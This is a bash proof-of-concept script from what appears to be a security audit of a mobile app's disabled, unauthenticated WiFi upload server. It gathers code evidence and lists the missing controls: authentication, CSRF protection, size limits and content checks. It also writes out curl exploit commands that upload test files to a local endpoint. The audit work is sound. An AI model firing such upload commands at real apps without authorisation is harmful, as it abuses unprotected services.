#!/usr/bin/env bash
set -euo pipefail
# ============================================================================
# PoC for M1: WiFi Transfer Server — Disabled but Contains Full Unauthenticated
#             File Upload Implementation
#
# Severity: MEDIUM
# PoC-Status: theoretical
#
# The vulnerable code (WifiTransferService) has a disabled start() method,
# so runtime exploitation is not currently possible. This script:
#   1. Verifies the vulnerable code exists and identifies the activation point
#   2. Demonstrates the exploit commands that would work IF the server were enabled
#   3. Captures code-level evidence of missing security controls
#
# Target: lib/core/network/wifi_transfer_service.dart
# ============================================================================

FINDING_DIR="$(cd "$(dirname "$0")" && pwd)"
EVIDENCE_DIR="$FINDING_DIR/evidence"
PROJECT_ROOT="$FINDING_DIR/../../../../.."  # Navigate up to repo root
mkdir -p "$EVIDENCE_DIR"

echo "====================================================================="
echo " M1: WiFi Transfer Server — Theoretical Exploit PoC"
echo "====================================================================="
echo ""

# ---------------------------------------------------------------------------
# Step 1: Verify vulnerable code exists
# ---------------------------------------------------------------------------
echo "[1] Verifying vulnerable code presence..."
VULN_FILE="$PROJECT_ROOT/lib/core/network/wifi_transfer_service.dart"
if [ -f "$VULN_FILE" ]; then
    echo "    [+] Target file exists: $VULN_FILE"
    wc -l "$VULN_FILE" 2>&1
else
    echo "    [-] Target file NOT FOUND at expected path, searching..."
    FOUND=$(find "$PROJECT_ROOT" -name "wifi_transfer_service.dart" 2>/dev/null | head -5)
    if [ -n "$FOUND" ]; then
        echo "    [+] Found at: $FOUND"
        VULN_FILE="$FOUND"
    else
        echo "    [-] Cannot locate vulnerable file. Exiting."
        exit 1
    fi
fi

# ---------------------------------------------------------------------------
# Step 2: Confirm the disabled start() and the active handler code
# ---------------------------------------------------------------------------
echo ""
echo "[2] Extracting key code sections..."

echo "    --- start() method (DISABLED) ---"
grep -n -A2 "Future<void> start()" "$VULN_FILE" | tee "$EVIDENCE_DIR/step2-start-method.txt"

echo ""
echo "    --- Routes registered in _handleRequest (no auth) ---"
grep -n "\"GET\" && path == '/'\|\"POST\" && path == '/upload'\|\"GET\" && path == '/api/status'" "$VULN_FILE" 2>/dev/null || \
grep -n "path == '/upload'\|path == '/api/status'\|path == '/'" "$VULN_FILE" | tee "$EVIDENCE_DIR/step2-routes.txt"

echo ""
echo "    --- _handleUpload method signature ---"
grep -n "_handleUpload" "$VULN_FILE" | tee "$EVIDENCE_DIR/step2-upload-handler.txt"

echo ""
echo "    --- File extension whitelist (only validation) ---"
grep -n "_supportedExtensions\|supportedExtensions" "$VULN_FILE" | tee "$EVIDENCE_DIR/step2-ext-check.txt"

echo ""
echo "    --- No size check in the upload handler ---"
grep -n "Content-Length\|contentLength\|maxSize\|size\|limit" "$VULN_FILE" | grep -v "formatSize\|_formatSize\|formattedTime\|_log\|fileName\|fileBytes.length\|prettySize\|_formatSize\|TransferLogEntry\|_size\|sized" || echo "    (no size limit checks found)"

# ---------------------------------------------------------------------------
# Step 3: Capture the full attacker-relevant code
# ---------------------------------------------------------------------------
echo ""
echo "[3] Capturing full vulnerable source for evidence..."
cp "$VULN_FILE" "$EVIDENCE_DIR/wifi_transfer_service.dart"
echo "    [+] Source copied to evidence/wifi_transfer_service.dart"

# ---------------------------------------------------------------------------
# Step 4: Write exploit reference commands
# ---------------------------------------------------------------------------
cat > "$EVIDENCE_DIR/exploit-commands.sh" << 'EXPLOIT_CMDS'
#!/usr/bin/env bash
# ============================================================================
# EXPLOIT COMMANDS — if WifiTransferService start() were enabled
#
# Default binding: http://127.0.0.1:<dynamic-port>
# The port is logged in the app UI. Find it, set PORT, then run:
# ============================================================================

PORT="${1:-8080}"

echo "=== M1 Exploit: WiFi Transfer Server (theoretical) ==="
echo "Target: http://127.0.0.1:$PORT"

# --- 1. Check server is alive (no auth required) ---
echo ""
echo "[1] GET /api/status (no auth):"
curl -s http://127.0.0.1:$PORT/api/status
echo ""

# --- 2. Upload a .txt file (no auth, no CSRF, no size limit) ---
echo ""
echo "[2] POST /upload with arbitrary .txt (no auth):"
echo "Hello, world! This is a malicious file." > /tmp/malicious.txt
curl -s -X POST http://127.0.0.1:$PORT/upload \
  -F "file=@/tmp/malicious.txt"
echo ""

# --- 3. Upload a .epub with wrong content (only extension checked) ---
echo ""
echo "[3] POST /upload with fake .epub (content not validated):"
echo "This is not really an epub file" > /tmp/fake.epub
curl -s -X POST http://127.0.0.1:$PORT/upload \
  -F "file=@/tmp/fake.epub"
echo ""

# --- 4. Upload a non-txt/epub extension (should be rejected) ---
echo ""
echo "[4] POST /upload with .exe (extension check):"
echo "malicious code" > /tmp/evil.exe
curl -s -X POST http://127.0.0.1:$PORT/upload \
  -F "file=@/tmp/evil.exe"
echo ""

EXPLOIT_CMDS
chmod +x "$EVIDENCE_DIR/exploit-commands.sh"
echo "    [+] Exploit command reference written to evidence/exploit-commands.sh"

# ---------------------------------------------------------------------------
# Step 5: Security control gap analysis
# ---------------------------------------------------------------------------
echo ""
echo "[4] Security control gap analysis..."
{
echo "=== Security Control Gaps ==="
echo ""
echo "1. Authentication: NONE"
echo "   - All three routes (GET /, POST /upload, GET /api/status)"
echo "     are accessible without any token, cookie, or session check."
echo "   - Any local process can call these endpoints."
echo ""
echo "2. CSRF Protection: NONE"
echo "   - No Origin/Referer header validation"
echo "   - No CSRF token required"
echo "   - Any website loaded in the same browser could submit uploads"
echo ""
echo "3. File Size Limit: NONE"
echo "   - _handleUpload reads the ENTIRE request body into memory:"
echo "     final bytes = await request.fold<List<int>>(<int>[], (prev, chunk) => prev..addAll(chunk));"
echo "   - A large upload (e.g. 1GB) would cause OOM crash"
echo ""
echo "4. Content Validation: Extension-Only"
echo "   - Only checked: if (ext is not in {txt, epub}) reject"
echo "   - No MIME type verification (Content-Type header is ignored)"
echo "   - No magic byte inspection"
echo ""
echo "5. Input Sanitization: NONE"
echo "   - Raw filename from Content-Disposition used in log output"
echo "   - Potential log injection via crafted filename"
echo ""
echo "6. Rate Limiting: NONE"
echo "   - An attacker can flood upload requests to exhaust resources"
echo ""
echo "7. HTTPS: NONE"
echo "   - All traffic in plaintext over loopback"
echo ""
echo "=== Activation Point ==="
echo "The server is currently disabled by an empty start() method."
echo "Any future developer who removes the ponytail comment and"
echo "uncomments/reimplements the server binding will activate"
echo "this unauthenticated upload server."
echo ""
echo "All handler methods are fully implemented and compiled"
echo "into the app binary regardless of whether start() is called."
} > "$EVIDENCE_DIR/gaps.txt"
cat "$EVIDENCE_DIR/gaps.txt"

# ---------------------------------------------------------------------------
# Step 6: Runtime check — confirm server is inactive
# ---------------------------------------------------------------------------
echo ""
echo "[5] Runtime check — verifying server is NOT active..."

ACTIVE=false
for PORT in 8080 8081 9090 9999; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 1 http://127.0.0.1:$PORT/api/status 2>/dev/null || echo "000")
    if [ "$CODE" = "200" ]; then
        echo "    [!] WARNING: Server appears to be running on port $PORT!"
        ACTIVE=true
    fi
done
if [ "$ACTIVE" = false ]; then
    echo "    [+] No active wifi transfer server detected (expected — start() is disabled)"
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo ""
echo "====================================================================="
echo " PoC Summary"
echo "====================================================================="
echo " PoC-Status: theoretical"
echo " Vulnerable file: $VULN_FILE"
echo " Activation guard: ponytail comment in start() method"
echo " Handler code: FULLY PRESENT (compiled into app binary)"
echo " Auth on /upload: NONE"
echo " Auth on /api/status: NONE"
echo " Auth on /: NONE"
echo " File validation: Extension-only (.txt, .epub)"
echo " Size limit: NONE"
echo ""
echo " Risk: If start() is re-enabled by a future developer, any local"
echo "       process can upload arbitrary .txt/.epub files without auth."
echo ""
echo " Exploit commands in: evidence/exploit-commands.sh"
echo " Full source backup: evidence/wifi_transfer_service.dart"
echo "====================================================================="

# Final JSON status line for pipeline parsing
echo '{"status":"confirmed","evidence":"Disabled but compiled-in unauthenticated HTTP upload server with active handler code and no auth/size/CSRF controls","notes":"Theoretical — start() is disabled by ponytail comment; all handler methods are fully implemented and present in the compiled binary"}'
